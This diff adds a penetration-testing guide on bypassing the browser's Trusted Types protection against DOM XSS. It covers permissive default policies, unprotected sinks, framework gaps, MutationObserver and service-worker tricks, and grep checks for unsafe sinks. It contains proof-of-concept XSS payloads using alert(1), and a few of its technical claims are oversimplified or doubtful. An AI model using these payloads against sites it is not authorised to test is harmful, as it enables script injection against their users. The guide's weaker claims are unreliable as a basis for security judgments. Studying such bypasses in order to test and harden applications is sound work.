@@ -1,0 +1,254 @@
+<vulnerability_guide>
+  <title>TRUSTED TYPES BYPASS</title>
+
+  <critical>Trusted Types is a browser security mechanism designed to eliminate DOM XSS by requiring that dangerous sinks only accept typed objects instead of strings. However, implementation gaps, policy misconfigurations, and bypass techniques can still allow DOM XSS exploitation.</critical>
+
+  <scope>
+    - Trusted Types policy analysis
+    - Default policy exploitation
+    - Policy bypass techniques
+    - Unsafe sink enumeration
+    - Framework-specific bypasses
+    - Implementation gaps
+  </scope>
+
+  <methodology>
+    1. TRUSTED TYPES DETECTION
+       {% raw %}
+       # Check for Trusted Types enforcement
+       # CSP header
+       Content-Security-Policy: require-trusted-types-for 'script'
+
+       # Check if Trusted Types are enabled
+       if (window.trustedTypes) {
+         console.log('Trusted Types supported');
+         console.log('Default policy:', trustedTypes.defaultPolicy);
+       }
+
+       # List defined policies
+       // Policies are created with trustedTypes.createPolicy()
+       // Check for overly permissive policies
+
+       # Test for enforcement
+       document.body.innerHTML = '<img src=x onerror=alert(1)>';
+       // Should throw TypeError if enforced
+       {% endraw %}
+
+    2. DEFAULT POLICY EXPLOITATION
+       {% raw %}
+       # Default policy handles all type conversions
+       # If misconfigured, can allow arbitrary HTML/scripts
+
+       # Vulnerable default policy example
+       trustedTypes.createPolicy('default', {
+         createHTML: (input) => input,  // No sanitization!
+         createScript: (input) => input,
+         createScriptURL: (input) => input
+       });
+
+       # With above policy, DOM XSS works normally
+       element.innerHTML = userInput;  // Converted by default policy
+
+       # Check default policy implementation
+       # Look for pass-through or weak sanitization
+       {% endraw %}
+
+    3. POLICY BYPASS TECHNIQUES
+       {% raw %}
+       # Bypass 1: Find existing policy that's too permissive
+       // Some policies may allow certain dangerous patterns
+       const policy = trustedTypes.createPolicy('sanitizer', {
+         createHTML: (input) => DOMPurify.sanitize(input)
+       });
+       // If DOMPurify has bypass, Trusted Types doesn't help
+
+       # Bypass 2: Prototype pollution
+       // If prototype pollution exists
+       Object.prototype.createHTML = (input) => input;
+       // May affect policy behavior
+
+       # Bypass 3: Policy name collision
+       // If attacker can define policy before legitimate one
+       trustedTypes.createPolicy('myapp-policy', {
+         createHTML: (input) => input  // Malicious
+       });
+       {% endraw %}
+
+    4. SINK ENUMERATION
+       {% raw %}
+       # Sinks protected by require-trusted-types-for 'script'
+       # - innerHTML, outerHTML
+       # - insertAdjacentHTML
+       # - document.write, document.writeln
+       # - eval (with eval() CSP)
+       # - script.src, script.text
+       # - location assignments (sometimes)
+
+       # Sinks NOT protected by Trusted Types
+       # - setAttribute (partial)
+       # - style.cssText
+       # - URLSearchParams
+       # - postMessage (data not typed)
+       # - localStorage/sessionStorage
+
+       # Find unprotected sinks
+       element.setAttribute('onclick', userInput);  // May work
+       element.style.cssText = userInput;  // CSS injection
+       {% endraw %}
+
+    5. FRAMEWORK BYPASSES
+       {% raw %}
+       # Angular Trusted Types bypass
+       # Angular has its own sanitization
+       # May conflict with or bypass TT
+
+       # React dangerouslySetInnerHTML
+       // React doesn't fully integrate with TT yet
+       <div dangerouslySetInnerHTML={{__html: userInput}} />
+
+       # jQuery bypasses
+       // jQuery's html() may not be TT-aware
+       $(element).html(userInput);
+
+       # Vue.js v-html
+       // v-html may bypass TT depending on version
+       <div v-html="userInput"></div>
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <mutation_observer_bypass>
+      {% raw %}
+      # Mutation Observers can modify DOM after TT check
+
+      # Observer modifies element after insertion
+      const observer = new MutationObserver((mutations) => {
+        mutations.forEach(m => {
+          if (m.type === 'childList') {
+            m.addedNodes.forEach(node => {
+              // Modify after TT validation
+              node.innerHTML = '<img src=x onerror=alert(1)>';
+            });
+          }
+        });
+      });
+
+      observer.observe(document.body, { childList: true });
+      {% endraw %}
+    </mutation_observer_bypass>
+
+    <unicode_normalization>
+      {% raw %}
+      # Unicode normalization may bypass policy sanitization
+
+      # Payload with unicode that normalizes to dangerous
+      const payload = 'ſcript';  // ſ (long s) normalizes to 's'
+
+      # If policy sanitizes after normalization
+      createHTML(payload.normalize('NFKC'));  // Becomes 'script'
+
+      # Test various unicode confusables
+      # ＜ (fullwidth <) → <
+      # ＞ (fullwidth >) → >
+      {% endraw %}
+    </unicode_normalization>
+
+    <browser_extension_bypass>
+      {% raw %}
+      # Browser extensions may inject content bypassing TT
+
+      # Extensions have elevated privileges
+      # Can modify DOM without TT restrictions
+      # Check for extension-injected content
+
+      # Content scripts can:
+      # - Modify innerHTML directly
+      # - Inject script tags
+      # - Access page without TT enforcement
+      {% endraw %}
+    </browser_extension_bypass>
+
+    <service_worker_bypass>
+      {% raw %}
+      # Service Workers may bypass TT
+
+      # SW response modification
+      self.addEventListener('fetch', event => {
+        event.respondWith(
+          new Response('<script>alert(1)</script>', {
+            headers: {'Content-Type': 'text/html'}
+          })
+        );
+      });
+
+      # SW injected content bypasses page TT policy
+      {% endraw %}
+    </service_worker_bypass>
+
+    <partial_implementation>
+      {% raw %}
+      # Many sites have partial TT implementation
+
+      # Check for:
+      # - TT header but no policies defined
+      # - Policies defined but not used everywhere
+      # - Legacy code paths without TT
+
+      # Find unprotected code paths
+      // Modern code uses TT
+      element.innerHTML = policy.createHTML(input);
+
+      // Legacy code doesn't
+      legacyElement.innerHTML = input;  // Still vulnerable
+
+      # Search codebase for direct sink access
+      grep -r "innerHTML\s*=" --include="*.js"
+      grep -r "document.write" --include="*.js"
+      {% endraw %}
+    </partial_implementation>
+
+    <csp_interaction>
+      {% raw %}
+      # TT requires CSP header to enforce
+
+      # If CSP is report-only
+      Content-Security-Policy-Report-Only: require-trusted-types-for 'script'
+      // No enforcement, only reporting
+
+      # If CSP can be bypassed (JSONP, etc.)
+      // TT enforcement may be circumventable
+
+      # Missing trusted-types directive
+      // Policy names aren't restricted
+      trustedTypes.createPolicy('anything', {...});
+      {% endraw %}
+    </csp_interaction>
+  </advanced_techniques>
+
+  <detection>
+    - Check CSP for require-trusted-types-for directive
+    - Audit defined Trusted Types policies
+    - Review default policy implementation
+    - Identify unprotected sinks in application
+    - Monitor Trusted Types violation reports
+  </detection>
+
+  <validation>
+    - Identify Trusted Types implementation level
+    - Find permissive or bypassable policies
+    - Locate sinks not protected by TT
+    - Demonstrate DOM XSS despite TT
+    - Document bypass technique used
+  </validation>
+
+  <pro_tips>
+    - Trusted Types is only enforced if CSP header is present
+    - Default policy is the most common weakness
+    - Check for innerHTML in non-TT-aware libraries
+    - Browser DevTools Console shows TT violations
+    - Partial implementations leave gaps - check legacy code
+    - setAttribute('onX') may bypass depending on implementation
+  </pro_tips>
+
+  <remember>Trusted Types is the strongest DOM XSS defense when properly implemented, but "properly" is the key word. Most real-world implementations have gaps: permissive default policies, legacy code paths, or framework conflicts. Always test for both TT enforcement AND potential bypasses. The presence of Trusted Types doesn't mean DOM XSS is impossible.</remember>
+</vulnerability_guide>
